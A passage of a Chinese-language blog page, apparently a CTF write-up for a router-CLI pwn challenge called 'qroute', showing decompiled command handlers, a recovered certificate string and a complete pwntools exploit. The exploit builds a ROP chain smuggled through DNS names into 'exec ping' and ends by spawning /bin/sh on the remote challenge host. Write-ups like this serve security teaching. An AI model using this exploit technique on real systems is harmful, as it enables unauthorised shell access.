i++) &#123;<br>    main__Route rr = at_slice_main_Route(r-&gt;routes, i);<br>    <span class="hljs-keyword">if</span> (len_String(rr.prefix) == arg_len &amp;&amp;<br>        runtime_memequal(rr.prefix.str, arg.str, arg_len)) &#123;<br>      r-&gt;routes =<br>          slice_main_Route(r-&gt;routes, <span class="hljs-number">0</span>, i - <span class="hljs-number">1</span>, r-&gt;routes);<br>      r-&gt;routes = slice_main_Route(r-&gt;routes, i + <span class="hljs-number">1</span>,<br>                                   len_slice_main_Route(r-&gt;routes), r-&gt;routes);<br>      r-&gt;routes = append_slice_main_Route(<br>          r-&gt;routes,<br>          slice_main_Route(r-&gt;routes, i, len_slice_main_Route(r-&gt;routes),<br>                           r-&gt;routes));<br>      r-&gt;log(concat_String(String_lit(<span class="hljs-string">&quot;Deleted route to &quot;</span>), arg));<br>      <span class="hljs-keyword">return</span> fmt_Fprintf(os__Stderr, String_lit(<span class="hljs-string">&quot;Deleted route to %s\n&quot;</span>),<br>                         &amp;([]String&#123;&#123;&amp;RTYPE_string, convTstring(arg)&#125;&#125;&#125;, <span class="hljs-number">1</span>,<br>                         <span class="hljs-number">1</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> fmt_Fprintf(os__Stderr, String_lit(<span class="hljs-string">&quot;Route to %s not found\n&quot;</span>),<br>                     &amp;([]String&#123;&#123;&amp;RTYPE_string, convTstring(arg)&#125;&#125;&#125;, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (len_String(argv[<span class="hljs-number">1</span>]) == <span class="hljs-number">9</span> &amp;&amp;<br>    ((((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">0</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">0</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">1</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">1</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">2</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">2</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">3</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">3</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">4</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">4</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">5</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">5</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">6</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">6</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">7</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">7</span>] &amp;&amp;<br>     (((String)&#123;<span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-string">&quot;interface&quot;</span>&#125;).str)[<span class="hljs-number">8</span>] == argv[<span class="hljs-number">1</span>].str[<span class="hljs-number">8</span>]))) &#123;<br>  String arg = argv[<span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure>
+
+<h3 id="config-mode"><a href="#config-mode" class="headerlink" title="config mode"></a>config mode</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">static inline <span class="hljs-type">bool</span> Router_enterConfigMode(<span class="hljs-keyword">struct</span> Router *router) &#123;<br>  <span class="hljs-keyword">if</span> (!router-&gt;is_config) &#123;<br>    fmt_Fprintln(<br>        os, <span class="hljs-string">&quot;You need to enable the configuration mode first, using &#x27;config&#x27;.&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  router-&gt;is_config_mode = <span class="hljs-literal">true</span>;<br>  fmt_Fprintln(os, <span class="hljs-string">&quot;Entering configuration mode.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">static <span class="hljs-type">int</span> _main__ptr_Router_show(<span class="hljs-keyword">struct</span> _main__ptr_Router *self,<br>                                   <span class="hljs-keyword">struct</span> String *command,<br>                                   <span class="hljs-keyword">struct</span> String *args, <span class="hljs-type">int</span> verb, <span class="hljs-type">int</span> argc,<br>                                   <span class="hljs-type">int</span> argv, <span class="hljs-type">int</span> argc2, <span class="hljs-type">int</span> argv2) &#123;<br>  <span class="hljs-keyword">if</span> (String_size(command) == <span class="hljs-number">3</span> &amp;&amp; String_equals(command, <span class="hljs-string">&quot;nets&quot;</span>)) &#123;<br>    fmt_Fprintln(stdout, <span class="hljs-string">&quot;Networks:\n&quot;</span>);<br>    &#123;<br>      <span class="hljs-keyword">struct</span> _main__ptr_Network *net;<br>      foreach (net, self-&gt;networks) &#123;<br>        <span class="hljs-keyword">struct</span> String *name = net-&gt;name;<br>        <span class="hljs-keyword">struct</span> String *ip = net-&gt;ip;<br>        <span class="hljs-keyword">struct</span> String *mask = net-&gt;mask;<br>        fmt_Fprintf(stdout, <span class="hljs-string">&quot;Domain: %s, IP: %s\n&quot;</span>, <span class="hljs-number">19</span>,<br>                    runtime_convTstring(name, RTYPE_String),<br>                    runtime_convTstring(mask, RTYPE_String), <span class="hljs-number">2</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (String_size(command) == <span class="hljs-number">4</span> &amp;&amp; String_equals(command, <span class="hljs-string">&quot;dns&quot;</span>)) &#123;<br>    fmt_Fprintln(stdout, <span class="hljs-string">&quot;DNS:\n&quot;</span>);<br>    &#123;<br>      <span class="hljs-keyword">struct</span> String *dns;<br>      foreach (dns, self-&gt;dns) &#123;<br>        fmt_Fprintln(stdout, <span class="hljs-string">&quot;\t%s\n&quot;</span>, <span class="hljs-number">1</span>, runtime_convTstring(dns, RTYPE_String));<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (String_size(command) == <span class="hljs-number">6</span> &amp;&amp; String_equals(command, <span class="hljs-string">&quot;routes&quot;</span>)) &#123;<br>    fmt_Fprintln(stdout, <span class="hljs-string">&quot;Routes:\n&quot;</span>);<br>    &#123;<br>      <span class="hljs-keyword">struct</span> _main__ptr_Route *route;<br>      foreach (route, self-&gt;routes) &#123;<br>        <span class="hljs-keyword">struct</span> String *dest = route-&gt;dest;<br>        <span class="hljs-keyword">struct</span> String *gate = route-&gt;gate;<br>        <span class="hljs-keyword">struct</span> String *iface = route-&gt;iface;<br>        fmt_Fprintf(stdout, <span class="hljs-string">&quot;Destination: %s, Gateway: %s, Interface: %s\n&quot;</span>, <span class="hljs-number">44</span>,<br>                    runtime_convTstring(dest, RTYPE_String),<br>                    runtime_convTstring(gate, RTYPE_String),<br>                    runtime_convTstring(iface, RTYPE_String));<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (String_size(command) == <span class="hljs-number">10</span> &amp;&amp; String_equals(command, <span class="hljs-string">&quot;interfaces&quot;</span>)) &#123;<br>    fmt_Fprintln(stdout, <span class="hljs-string">&quot;Interfaces:\n&quot;</span>);<br>    &#123;<br>      <span class="hljs-keyword">struct</span> _main__ptr_Interface *iface;<br>      foreach (iface, self-&gt;interfaces) &#123;<br>        <span class="hljs-keyword">struct</span> String *name = iface-&gt;name;<br>        <span class="hljs-keyword">struct</span> String *ip = iface-&gt;ip;<br>        <span class="hljs-keyword">struct</span> String *mac = iface-&gt;mac;<br>        <span class="hljs-keyword">struct</span> String *status = iface-&gt;status;<br>        fmt_Fprintf(stdout, <span class="hljs-string">&quot;Name: %s, IP Address: %s, MAC Address: %s, Status: %s\n&quot;</span>,<br>                    <span class="hljs-number">54</span>, runtime_convTstring(name, RTYPE_String),<br>                    runtime_convTstring(ip, RTYPE_String),<br>                    runtime_convTstring(mac, RTYPE_String),<br>                    runtime_convTstring(status, RTYPE_String));<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  fmt_Fprintln(stdout, <span class="hljs-string">&quot;Bad command: %s\n&quot;</span>, <span class="hljs-number">1</span>, runtime_convTstring(command, RTYPE_String));<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="cert"><a href="#cert" class="headerlink" title="cert"></a>cert</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">static <span class="hljs-type">bool</span> _ptr_Router_cert(<span class="hljs-keyword">struct</span> Router *r, uint8_t *key, uint8_t *cert,<br>                             <span class="hljs-type">int</span> keylen) &#123;<br>  uint8_t *encrypted;<br>  encrypted = main_rc4EncryptDecrypt(key, <span class="hljs-number">7</span>, cert, <span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">if</span> (!encrypted) &#123;<br>    <span class="hljs-keyword">if</span> (keylen == <span class="hljs-number">7</span> &amp;&amp; memequal(encrypted, <span class="hljs-string">&quot;cliroutego&quot;</span>, <span class="hljs-number">7</span>)) &#123;<br>      r-&gt;isCliroute = <span class="hljs-literal">true</span>;<br>      fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;cliroute: &quot;</span> Color_Green <span class="hljs-string">&quot;certificate accepted&quot;</span> Reset);<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;cliroute: &quot;</span> Color_Red <span class="hljs-string">&quot;certificate rejected&quot;</span> Reset);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  fmt_Fprintln(os_Stderr, <span class="hljs-string">&quot;cliroute: &quot;</span> Color_Red <span class="hljs-string">&quot;certificate decrypted&quot;</span> Reset,<br>               encrypted, <span class="hljs-number">10</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>命令有：</p>
+<p>configure、show、cert</p>
+<p>delete、exec、set</p>
+<p>logout、exit</p>
+<p><img src="/images/1730548219835.png" alt="1730548219835"></p>
+<p>4ceb539da109caf8eea7</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">exec ping host 127.0.0.1<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">exec traceroute host 127.0.0.1<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="攻击成功"><a href="#攻击成功" class="headerlink" title="攻击成功"></a>攻击成功</h2><p>拿下二血：</p>
+<p><img src="/images/1730561582867.png" alt="1730561582867"></p>
+<p><img src="/images/1730561593308.png" alt="1730561593308"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>import sys<br><br>file = &quot;./pwn&quot;<br>if len(sys.argv) == 1 or sys.argv[1] == &#x27;l&#x27;:<br>    sh = process(file)<br>elif sys.argv[1] == &#x27;r&#x27;:<br>    sh = remote(&quot;39.106.54.211&quot;,  34933)<br>elf = ELF(file)<br><br>def ru(string):<br>    sh.recvuntil(string)<br>def dbg():<br>    if len(sys.argv) &gt; 1 and sys.argv[1] == &#x27;r&#x27;:<br>        return<br>    gdb.attach(sh)<br>    pause()<br>def sl(content):<br>    sh.sendline(content)<br>def itr():<br>    sh.interactive()<br>context.log_level = &#x27;debug&#x27;<br>def get_heap():<br>    res = 0<br>    res = u64(sh.recvuntil(&quot;\x55&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    if res == 0:<br>        res = u64(sh.recvuntil(&quot;\x56&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    return res<br>def get_libc():<br>    res = 0<br>    res = u64(sh.recvuntil(&quot;\x7f&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    if res == 0:<br>        res = u64(sh.recvuntil(&quot;\x7e&quot;, timeout=0.2)[-6:].ljust(8, b&#x27;\x00&#x27;))<br>    return res<br>def get_tcache():<br>    res = u64(sh.recvuntil(&quot;\x05&quot;)[-5:].ljust(8, b&quot;\x00&quot;))<br>    return res<br><br>def cmd(order):<br>    ru(&quot;Router#&quot;)<br>    sl(order)<br>def cmd1(order):<br>    ru(&quot;Router(config)# &quot;)<br>    sl(order)<br><br>def ping(ip):<br>    pay = &quot;exec ping host &quot; + ip<br>    cmd1(pay)<br><br>def dns(name, ip):<br>    pay = &quot;set dns &quot; + name + &#x27; &#x27; + ip<br>    cmd1(pay)<br><br>def interface(name, ip):<br>    pay = &quot;set interface &quot; + name + &#x27; &#x27; + ip + &quot; 12:12:12 valid&quot;<br>    cmd1(pay)<br><br>def route(ip1, ip2, interface):<br>    pay = &quot;set route &quot; + ip1 + &#x27; &#x27; + ip2 + &#x27; &#x27; + interface<br>    cmd1(pay)<br><br>def trace(ip):<br>    pay = &quot;exec traceroute host &quot; + ip<br>    cmd1(pay)<br><br>pop_rdi_ret = 0x00000000004c23dd<br>syscall_ret = 0x471529<br>bss = 0x5F7850 <br>pop_rbx_ret = 0x0000000000461dc1<br>pop_rsi_need_rbx_ret = 0x0000000000462560<br>pop_rax_pop3_ret = 0x0000000000432c4b<br>pop_rdx_need_rax_ret = 0x000000000040d8af<br>ret = 0x00000000004D8594<br>pop_rbp_ret = 0x0000000000401030<br><br>def func():<br>    cmd(&quot;cert 4ceb539da109caf8eea7&quot;)<br>    cmd(&quot;configure&quot;)<br>    <br>    dns(&#x27;1.1.1.1&#x27;, &#x27;a&#x27;)<br>    dns(&#x27;2.2.2.2&#x27;, &#x27;b&#x27;)<br><br><br>    route(&#x27;1.1.1.1&#x27;, &#x27;2.2.2.2&#x27;, &#x27;i1&#x27;)<br>    route(&#x27;2.2.2.2&#x27;, &#x27;3.3.3.3&#x27;, &#x27;i1&#x27;)<br><br>    a = p64(0).decode(&quot;iso-8859-1&quot;)*6<br>    aa = p64(0x1234).decode(&quot;iso-8859-1&quot;)*6<br>    b = a+&#x27;.&#x27;<br>    bb = aa+&#x27;.&#x27;<br><br>    goal = 0x00000000004019d8<br>    low = (goal&amp;0xffffff) &lt;&lt; (64-24)<br>    high = goal &gt;&gt; 24<br>    att = p64(0) * 2 + p64(3) + p64(low)+p64(high)+p64(6) + b&#x27;.&#x27;<br>    att = att.decode(&quot;iso-8859-1&quot;)<br><br>    mid = p64(0) * 2 + b&#x27;aaa.&#x27; + p64(pop_rdi_ret) + p64(0) + p64(pop_rbp_ret) + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(pop_rbx_ret) + p64(bss-0x100) + p64(pop_rsi_need_rbx_ret) + p64(bss) + p64(pop_rax_pop3_ret) + p64(bss-0x100) + p64(0) + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0) + p64(pop_rdx_need_rax_ret) + p64(0x100) + p64(pop_rax_pop3_ret)+ p64(0) +p64(0x12345678)*2 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(syscall_ret) + p64(pop_rdi_ret) + p64(bss) + p64(pop_rbx_ret) + p64(bss-0x100) + p64(pop_rax_pop3_ret) + p64(bss-0x100)+ b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0)*2 + p64(pop_rdx_need_rax_ret) + p64(0) + p64(pop_rsi_need_rbx_ret) + p64(0) + p64(pop_rbp_ret) + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(pop_rax_pop3_ret) + p64(59) + p64(0)*3 + p64(syscall_ret) + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    mid += p64(0x12345678) * 7 + b&#x27;.aaaaaa.&#x27;<br>    <br>    mid = mid.decode(&quot;iso-8859-1&quot;)<br><br>    rop = p64(0x12345678) <br>    rop = rop.decode(&quot;iso-8859-1&quot;)<br><br>    name = b * 0xa + att + mid + a<br>    dns(name, &#x27;1&#x27;)  <br>    #dbg()<br>    ping(name)<br>    <br>    sl(&quot;/bin/sh\x00&quot;)<br><br>    sh.interactive()<br><br>if __name__ == &quot;__main__&quot;:<br>    func()<br><br></code></pre></td></tr></table></figure>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/01/14/qroute/">http://example.com/2025/01/14/qroute/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">John Doe</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2025/01/14/n1ctf_heap_master/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="n1ctf_heap_master">
+                        
+                        <span class="card-title">n1ctf_heap_master</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/kernel/">
+                        <span class="chip bg-color">kernel</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/01/14/sk_buff/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="eBPF与sk_buff">
+                        
+                        <span class="card-title">eBPF与sk_buff</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/kernel/">
+                        <span class="chip bg-color">kernel</span>
+                    </a>
+                    
+                    <a href="/tags/eBPF/">
+                        <span class="chip bg-color">eBPF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Qian-YM" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:yimingqian591@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1643771613" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1643771613" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
